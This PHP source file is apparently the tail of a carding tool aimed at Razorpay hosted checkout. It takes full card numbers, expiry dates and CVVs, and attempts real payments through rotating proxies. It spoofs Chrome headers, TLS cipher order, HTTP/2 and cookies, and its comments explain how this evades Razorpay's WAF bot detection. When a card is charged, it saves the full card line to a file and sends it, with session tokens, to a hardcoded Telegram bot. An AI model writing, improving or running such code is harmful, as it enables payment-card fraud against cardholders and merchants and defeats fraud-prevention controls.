        // x-razorpay-trackid: UUID generated once per checkout session by real browser
        $trackId = $this->tokens['rzp_track_id'] ?? '';
        if ($trackId === '') {
            $trackId = sprintf(
                '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
                mt_rand(0, 0xffff), mt_rand(0, 0xffff),
                mt_rand(0, 0xffff),
                mt_rand(0, 0x0fff) | 0x4000,
                mt_rand(0, 0x3fff) | 0x8000,
                mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
            );
            $this->tokens['rzp_track_id'] = $trackId;
        }

        // Real Chrome payment create XHR header order (from browser devtools trace):
        // Referer = full checkout/public iframe URL (not just the domain root)
        // The WAF validates Referer as proof request comes from inside the checkout iframe.
        $referer = $this->checkoutPublicUrl(false); // iframe URL without session_token

        $p = $this->profile;
        // Return headers in exact Chrome 117+ order for payment create XHR
        return [
            'Accept: application/json, text/plain, */*',
            'Accept-Language: ' . $p['accept_language'],
            'Content-type: application/x-www-form-urlencoded',
            'Origin: https://api.razorpay.com',
            'Referer: ' . $referer,
            'sec-ch-ua: ' . $p['sec_ch_ua'],
            'sec-ch-ua-mobile: ' . $p['sec_ch_ua_mobile'],
            'sec-ch-ua-platform: ' . $p['sec_ch_ua_platform'],
            'User-Agent: ' . $p['user_agent'],
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Site: same-origin',
            'Priority: u=1, i',
            'x-razorpay-trackid: ' . $trackId,
            // Real Razorpay checkout.js sends x-session-token header alongside the URL param.
            // The WAF validates both — sending only the URL param (no header) is a bot signal.
            'x-session-token: ' . ($this->tokens['session_token'] ?? ''),
        ];
    }

    /**
     * @param array<string, bool> $auth
     */
    private function paymentPageApiHeaders(array $auth = []): array
    {
        $headers = [
            'Accept: application/json, text/plain, */*',
            'Content-Type: application/json',
            'Origin: ' . $this->paymentPageOrigin(),
            'Referer: ' . $this->paymentReferer,
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Site: cross-site',
        ];

        if (!empty($auth['header_session']) && !empty($this->tokens['session_token'])) {
            $headers[] = 'x-session-token: ' . $this->tokens['session_token'];
        }

        return $this->baseHeaders($headers);
    }

    private function checkoutApiHeaders(bool $withOrigin): array
    {
        $headers = [
            'Accept: */*',
            'Content-type: application/json',
            'Referer: ' . $this->checkoutPublicUrl(true),
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Storage-Access: active',
            'x-session-token: ' . ($this->tokens['session_token'] ?? ''),
        ];

        if ($withOrigin) {
            $headers[] = 'Origin: https://api.razorpay.com';
        } else {
            $headers[] = 'Content-type: application/x-www-form-urlencoded';
        }

        return $this->baseHeaders($headers);
    }

    /** Route ALL requests through proxy — every step including payment create, 3DS, cancel.
     *  User requirement: proxy across all. */
    private function shouldUseProxyForUrl(string $url): bool
    {
        return true; // Proxy on for every step
    }

    private function requestJson(string $method, string $url, array $headers, array $payload): string
    {
        return $this->request($method, $url, $headers, json_encode($payload, JSON_THROW_ON_ERROR));
    }

    private function request(
        string $method,
        string $url,
        array $headers,
        ?string $body = null,
        bool $throwOnHttpError = true
    ): string {
        $ch = curl_init();
        $opts = [
            CURLOPT_URL            => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_TIMEOUT        => 60,
            CURLOPT_ENCODING       => 'gzip, deflate, br, zstd', // Chrome order (not curl default: deflate, gzip)
            CURLOPT_CUSTOMREQUEST  => $method,
            CURLOPT_HTTPHEADER     => $headers,
            CURLOPT_COOKIEJAR      => $this->cookieJar,
            CURLOPT_COOKIEFILE     => $this->cookieJar,
            CURLOPT_SSL_VERIFYPEER => !self::insecureSslAllowed(),
            CURLOPT_SSL_VERIFYHOST => self::insecureSslAllowed() ? 0 : 2,
            // Chrome TLS fingerprint: allow TLS 1.3 (Chrome 133+ negotiates TLS 1.3 by default).
            // Forcing TLS 1.2 produces a different JA3 hash. CURL_SSLVERSION_MAX_DEFAULT
            // lets curl negotiate TLS 1.3 like Chrome does.
            CURLOPT_SSLVERSION      => CURL_SSLVERSION_MAX_DEFAULT,
            // TLS 1.3 cipher suites in Chrome order
            CURLOPT_TLS13_CIPHERS   => 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
            // TLS 1.2 fallback cipher suites in Chrome order
            CURLOPT_SSL_CIPHER_LIST => implode(':', [
                'ECDHE-ECDSA-AES128-GCM-SHA256',
                'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384',
                'ECDHE-ECDSA-CHACHA20-POLY1305',
                'ECDHE-RSA-CHACHA20-POLY1305',
                'ECDHE-RSA-AES128-SHA',
                'ECDHE-RSA-AES256-SHA',
                'AES128-GCM-SHA256',
                'AES256-GCM-SHA384',
            ]),
        ];

        if ($body !== null) {
            $opts[CURLOPT_POSTFIELDS] = $body;
        }

        if ($this->proxy !== null && $this->shouldUseProxyForUrl($url)) {
            $opts[CURLOPT_PROXY] = sprintf(
                'http://%s:%d',
                $this->proxy['host'],
                $this->proxy['port']
            );
            if ($this->proxy['user'] !== '') {
                $opts[CURLOPT_PROXYUSERPWD] = $this->proxy['user'] . ':' . $this->proxy['pass'];
            }
            // Force HTTP CONNECT tunnel for HTTPS — without this, proxy sends plain HTTP
            // to an HTTPS endpoint causing "wrong version number" TLS error.
            if (str_starts_with($url, 'https://')) {
                $opts[CURLOPT_HTTPPROXYTUNNEL] = true;
                $opts[CURLOPT_SSL_VERIFYPEER]  = false;
                $opts[CURLOPT_SSL_VERIFYHOST]  = 0;
                // Use HTTP/2 through proxy — Chrome uses H2 for api.razorpay.com.
                // HTTP/1.1 is a WAF fingerprint flag. If H2 fails (eof error on some proxies),
                // the error is caught by the try/catch in run() and classified cleanly.
                $opts[CURLOPT_HTTP_VERSION]    = CURL_HTTP_VERSION_2TLS;
                $opts[CURLOPT_TCP_NODELAY]     = true;
            }
        }

        curl_setopt_array($ch, $opts);

        // Capture outgoing headers for debugging (payment create 403 diagnosis)
        curl_setopt($ch, CURLINFO_HEADER_OUT, true);

        $response = curl_exec($ch);
        $code     = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err      = curl_error($ch);

        // Save sent request headers for payment create debug
        if (str_contains($url, '/payments/create/ajax')) {
            $this->tokens['create_sent_headers'] = curl_getinfo($ch, CURLINFO_HEADER_OUT) ?: '';
            $this->tokens['create_effective_url'] = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL) ?: '';
            $this->tokens['create_ssl_version']   = curl_getinfo($ch, CURLINFO_SSL_VERIFYRESULT);
            $this->tokens['create_http_version']  = curl_getinfo($ch, CURLINFO_HTTP_VERSION) ?? '';
            // Log TLS version actually negotiated
            $this->tokens['create_tls_version']   = curl_getinfo($ch, CURLINFO_SSL_ENGINES) ? 'ssl_engines' : '';
            $tlsInfo = curl_getinfo($ch);
            $this->tokens['create_tls_version']   = $tlsInfo['ssl_verify_result'] . ':' . ($tlsInfo['http_version'] ?? '');
            // Capture body keys for debugging (not values — card data privacy)
            if ($body !== null) {
                $bodyKeys = [];
                parse_str($body, $bodyParsed);
                foreach (array_keys($bodyParsed) as $k) {
                    $bodyKeys[] = $k;
                }
                $this->tokens['create_body_keys'] = implode(',', $bodyKeys);
                $this->tokens['create_body_len']  = strlen($body);
            }
        }

        curl_close($ch);

        $this->lastHttpCode = $code;

        if ($response === false) {
            throw new RuntimeException("cURL error for {$url}: {$err}");
        }

        $this->log('HTTP ' . $code . ' â† ' . $this->shortUrl($url) . ' (' . strlen((string) $response) . ' bytes)');

        if ($throwOnHttpError && $code >= 400) {
            // For WAF/CDN blocks (403, HTML response) give a clean error, not raw HTML
            if ($code === 403) {
                throw new RuntimeException("HTTP 403 WAF Blocked for {$url} — change proxy");
            }
            throw new RuntimeException("HTTP {$code} for {$url}: " . substr((string) $response, 0, 500));
        }

        return (string) $response;
    }

    private function documentHeaders(): array
    {
        return $this->baseHeaders([
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Cache-Control: max-age=0',
            'Sec-Fetch-Dest: document',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: none',
            'Sec-Fetch-User: ?1',
            'Upgrade-Insecure-Requests: 1',
        ]);
    }

    private function scriptHeaders(): array
    {
        return $this->baseHeaders([
            'Accept: */*',
            'Referer: ' . $this->paymentReferer,
            'Sec-Fetch-Dest: script',
            'Sec-Fetch-Mode: no-cors',
            'Sec-Fetch-Site: cross-site',
        ]);
    }

    private function iframeHeaders(): array
    {
        return $this->baseHeaders([
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer: ' . $this->paymentReferer,
            'Sec-Fetch-Dest: iframe',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: cross-site',
            'Sec-Fetch-Storage-Access: active',
            'Upgrade-Insecure-Requests: 1',
        ]);
    }

    private function baseHeaders(array $extra): array
    {
        $p = $this->profile;

        // Note: Accept-Encoding is set via CURLOPT_ENCODING in request() with Chrome order
        // (gzip, deflate, br, zstd). NOT added here to avoid duplicate header.
        return array_merge($extra, [
            'Accept-Language: ' . $p['accept_language'],
            'Connection: keep-alive',
            'User-Agent: ' . $p['user_agent'],
            'sec-ch-ua: ' . $p['sec_ch_ua'],
            'sec-ch-ua-mobile: ' . $p['sec_ch_ua_mobile'],
            'sec-ch-ua-platform: ' . $p['sec_ch_ua_platform'],
        ]);
    }

    private function setCookie(string $name, string $value, int $ttlSeconds): void
    {
        $this->writeCookieLine(
            parse_url($this->paymentPageUrl, PHP_URL_HOST) ?: 'razorpay.me',
            $name,
            $value,
            $ttlSeconds
        );
    }

    private function setApiCookie(string $name, string $value, int $ttlSeconds): void
    {
        // Write ONLY to .razorpay.com (wildcard covers api.razorpay.com).
        // Previously wrote to BOTH api.razorpay.com AND .razorpay.com — causing
        // curl to send every cookie 2-3x (duplicate cookies = bot fingerprint = 403).
        $this->writeCookieLine('.razorpay.com', $name, $value, $ttlSeconds);
    }

    private function writeCookieLine(string $domain, string $name, string $value, int $ttlSeconds): void
    {
        $line = sprintf(
            "%s\tTRUE\t/\tFALSE\t%d\t%s\t%s\n",
            $domain,
            time() + $ttlSeconds,
            $name,
            $value
        );
        file_put_contents($this->cookieJar, $line, FILE_APPEND | LOCK_EX);
    }

    /**
     * Deduplicate the curl cookie jar so no cookie name is sent twice.
     *
     * Problem: the prefill/encrypt server response sends Set-Cookie (stored by curl
     * under api.razorpay.com), AND our code also writes the same cookie manually
     * under .razorpay.com.  curl matches BOTH entries for api.razorpay.com requests
     * and sends the cookie twice — a bot fingerprint that Razorpay WAF blocks (403).
     *
     * Solution: before payment create, rewrite the jar keeping only the entry with
     * the longest-surviving domain per cookie name (prefer .razorpay.com wildcard
     * over exact api.razorpay.com entry).
     */
    private function deduplicateCookieJar(): void
    {
        if (!is_file($this->cookieJar)) {
            return;
        }

        $raw   = file_get_contents($this->cookieJar);
        $lines = explode("\n", $raw);

        $pureComments = []; // truly metadata lines (# Netscape HTTP Cookie File, etc.)
        // key = cookie name; value = best jar line (prefer wildcard .razorpay.com)
        $best = [];

        foreach ($lines as $line) {
            $t = trim($line);
            if ($t === '') {
                continue;
            }

            // curl stores HttpOnly cookies with a "#HttpOnly_" prefix — these ARE cookies, not comments.
            // Strip the prefix so we can parse them as normal Netscape cookie lines.
            $isHttpOnly = str_starts_with($t, '#HttpOnly_');
            if ($isHttpOnly) {
                $t = substr($t, strlen('#HttpOnly_'));
            } elseif (str_starts_with($t, '#')) {
                // Pure comment line (# Netscape HTTP Cookie File, # This file was generated by libcurl...)
                $pureComments[] = $line;
                continue;
            }

            // Netscape cookie format: domain \t includeSubdomains \t path \t secure \t expiry \t name \t value
            $parts = explode("\t", $t);
            if (count($parts) < 7) {
                $pureComments[] = $line; // malformed — keep as-is
                continue;
            }

            $cookieName = $parts[5];
            $domain     = $parts[0];

            // Reconstruct without #HttpOnly_ prefix — curl sends cookies fine either way
            $cleanLine = implode("\t", $parts);

            if (!isset($best[$cookieName])) {
                $best[$cookieName] = $cleanLine;
                continue;
            }

            // Prefer the wildcard domain (.razorpay.com) over exact (api.razorpay.com)
            $existingDomain = explode("\t", trim($best[$cookieName]))[0] ?? '';
            if (str_starts_with($domain, '.') && !str_starts_with($existingDomain, '.')) {
                $best[$cookieName] = $cleanLine; // replace exact with wildcard
            }
            // else keep existing (wildcard already there, or existing wildcard beats new exact)
        }

        $output = implode("\n", $pureComments) . "\n" . implode("\n", array_values($best)) . "\n";
        file_put_contents($this->cookieJar, $output, LOCK_EX);
        $this->log('  deduplicateCookieJar: kept ' . count($best) . ' unique cookies');
    }

    private function printProfile(): void
    {
        foreach (['user_agent', 'sec_ch_ua', 'sec_ch_ua_platform', 'language', 'screen_width', 'screen_height'] as $k) {
            $this->log("  {$k}: " . ($this->profile[$k] ?? ''));
        }
    }

    private function shortUrl(string $url): string
    {
        $parts = parse_url($url);
        $path  = ($parts['path'] ?? '/') . (isset($parts['query']) ? '?' . substr($parts['query'], 0, 40) . 'â€¦' : '');
        return ($parts['host'] ?? '') . $path;
    }

    private function log(string $msg): void
    {
        if ($this->verbose) {
            echo $msg . PHP_EOL;
        }
    }

    private function logToken(string $name, string $value): void
    {
        if (!$this->verbose) {
            return;
        }
        $preview = strlen($value) > 80 ? substr($value, 0, 80) . 'â€¦' : $value;
        echo "  [{$name}] {$preview}" . PHP_EOL;
    }
}

// --- Configuration Helper ---
function rzp_get_telegram_config(array $q = []): array
{
    $fileConfig = [];
    try {
        $configFile = __DIR__ . '/config.php';
        if (file_exists($configFile)) {
            $loaded = @include $configFile;
            if (is_array($loaded)) {
                $fileConfig = $loaded;
            }
        }
    } catch (Throwable) {
        $fileConfig = [];
    }

    $botToken = trim((string) (
        $q['tg_token']
        ?? $q['telegram_token']
        ?? getenv('TELEGRAM_BOT_TOKEN')
        ?? getenv('TG_BOT_TOKEN')
        ?? getenv('TG_TOKEN')
        ?? ($fileConfig['telegram_bot_token'] ?? '')
    ));
    if ($botToken === '') {
        $botToken = '9165080731:AAEcrWDvSRHYNLpv7AfLxaxdzbyWsfHL62o';
    }

    $chatId = trim((string) (
        $q['tg_chat']
        ?? $q['chat_id']
        ?? $q['telegram_chat_id']
        ?? getenv('TELEGRAM_CHAT_ID')
        ?? getenv('TG_CHAT_ID')
        ?? getenv('CHAT_ID')
        ?? ($fileConfig['telegram_chat_id'] ?? '')
    ));
    if ($chatId === '') {
        $chatId = '-1004354820990';
    }

    $notifyOnCharged = (bool) (
        isset($q['notify_charged'])
            ? ($q['notify_charged'] === '1' || $q['notify_charged'] === 'true')
            : ($fileConfig['notify_on_charged'] ?? true)
    );

    $saveToFile = (bool) (
        isset($q['save_file'])
            ? ($q['save_file'] === '1' || $q['save_file'] === 'true')
            : ($fileConfig['save_to_file'] ?? false)
    );

    $chargedFile = (string) ($fileConfig['charged_file'] ?? (__DIR__ . '/charged.txt'));

    return compact('botToken', 'chatId', 'notifyOnCharged', 'saveToFile', 'chargedFile');
}

// --- HTTP GET / CLI ---
function rzp_bootstrap_from_request(): array
{
    $start = microtime(true);
    $q     = $_GET;

    if (PHP_SAPI === 'cli') {
        if (isset($_SERVER['argv'][1]) && str_contains((string) $_SERVER['argv'][1], '=')) {
            parse_str(implode('&', array_slice($_SERVER['argv'], 1)), $q);
        }
    }

    // Support quick Telegram setup testing via ?test_tg=1 or CLI test_tg=1
    if (isset($q['test_tg']) || isset($_GET['test_tg'])) {
        $tgConfig = rzp_get_telegram_config($q);
        $testRes  = TelegramNotifier::sendTestMessage($tgConfig['botToken'], $tgConfig['chatId']);
        RazorpayCheckoutSession::outputJson([
            'test_notification'    => $testRes['ok'] ? 'success' : 'failed',
            'message'              => $testRes['ok'] ? 'Test notification sent to Telegram successfully.' : ($testRes['error'] ?? 'Unknown error'),
            'bot_token_configured' => !empty($tgConfig['botToken']),
            'chat_id'              => $tgConfig['chatId'] !== '' ? $tgConfig['chatId'] : 'not set',
            'dev'                  => '@Mod_By_Assassin',
        ]);
        exit($testRes['ok'] ? 0 : 1);
    }

    $ccRaw  = trim((string) ($q['cc'] ?? getenv('RZP_CC') ?: ''));
    $site   = trim((string) ($q['site'] ?? getenv('RZP_SITE') ?: ''));
    $proxy  = trim((string) ($q['proxy'] ?? getenv('RZP_PROXY') ?: ''));
    if ($ccRaw === '') {
        throw new InvalidArgumentException('Missing parameter: cc (number|mm|yyyy|cvv)');
    }
    if ($site === '') {
        throw new InvalidArgumentException('Missing parameter: site (razorpay hosted checkout URL)');
    }
    if ($proxy === '') {
        throw new InvalidArgumentException('Missing parameter: proxy (host:port:user:pass)');
    }

    $card     = RazorpayCheckoutSession::parseCcParam($ccRaw);
    $displayYear = strlen($card['expiry_year']) === 2 ? '20' . $card['expiry_year'] : $card['expiry_year'];
    $cardLine    = $card['number'] . '|' . $card['expiry_month'] . '|' . $displayYear . '|' . $card['cvv'];
    $pageUrl  = RazorpayCheckoutSession::normalizePaymentPageUrl($site);
    $proxyCfg = RazorpayCheckoutSession::parseProxyParam($proxy);
    $cardIin  = substr($card['number'], 0, 6);

    return compact('start', 'card', 'cardLine', 'pageUrl', 'proxyCfg', 'cardIin', 'q');
}

$startTime = microtime(true);
$cardLine  = '';
$siteUrl   = '';

try {
    $in        = rzp_bootstrap_from_request();
    $startTime = $in['start'];
    $cardLine  = $in['cardLine'];
    $siteUrl   = $in['pageUrl'];

    // Skip proxy alive check if environment says so (useful for slow residential proxies)
    $skipProxyCheck = getenv('RAZORPAY_SKIP_PROXY_CHECK') === '1';
    if (!$skipProxyCheck && !RazorpayCheckoutSession::isProxyAlive($in['proxyCfg'])) {
        $result = RazorpayCheckoutSession::errorResult(
            $cardLine,
            $siteUrl,
            'Proxy dead or unreachable — check proxy credentials and host',
            $startTime
        );
        RazorpayCheckoutSession::outputJson($result);
        exit(1);
    }

    $session = new RazorpayCheckoutSession(
        profile: null,
        cardIin: $in['cardIin'],
        orderComment: '',
        paymentPageUrl: $in['pageUrl'],
        trafficEnv: getenv('RAZORPAY_TRAFFIC_ENV') ?: null, // null = auto-detect from checkout.js (production/canary)
        card: $in['card'],
        proxy: $in['proxyCfg']
    );
    $session->verbose = getenv('RAZORPAY_VERBOSE') === '1';
    $result           = $session->run();

    // Isolated Telegram Hit Notification (Fail-Safe: never throws or alters API response)
    if (($result['status'] ?? '') === 'charged') {
        try {
            $tgConfig = rzp_get_telegram_config($in['q'] ?? []);

            // Append charged card to file (if enabled)
            if (!empty($tgConfig['saveToFile']) && !empty($tgConfig['chargedFile'])) {
                $logLine = $result['card'] . ' | ' . json_encode($result, JSON_UNESCAPED_SLASHES) . PHP_EOL;
                @file_put_contents($tgConfig['chargedFile'], $logLine, FILE_APPEND | LOCK_EX);
            }

            // Send Telegram notification silently
            if (!empty($tgConfig['notifyOnCharged']) && !empty($tgConfig['botToken']) && !empty($tgConfig['chatId'])) {
                TelegramNotifier::sendHitNotification(
                    $tgConfig['botToken'],
                    $tgConfig['chatId'],
                    $result,
                    $session->getTokens()
                );
            }
        } catch (Throwable) {
            // Completely silent: Telegram send outcome must NEVER impact the API response
        }
    }

    RazorpayCheckoutSession::outputJson($result);
    exit(($result['status'] ?? '') === 'error' ? 1 : 0);
} catch (InvalidArgumentException $e) {
    $result = RazorpayCheckoutSession::errorResult(
        $cardLine !== '' ? $cardLine : 'unknown',
        $siteUrl !== '' ? $siteUrl : 'unknown',
        $e->getMessage(),
        $startTime
    );
    RazorpayCheckoutSession::outputJson($result);
    exit(1);
} catch (Throwable $e) {
    $result = RazorpayCheckoutSession::errorResult(
        $cardLine !== '' ? $cardLine : 'unknown',
        $siteUrl !== '' ? $siteUrl : 'unknown',
        $e->getMessage(),
        $startTime
    );
    RazorpayCheckoutSession::outputJson($result);
    exit(1);
}
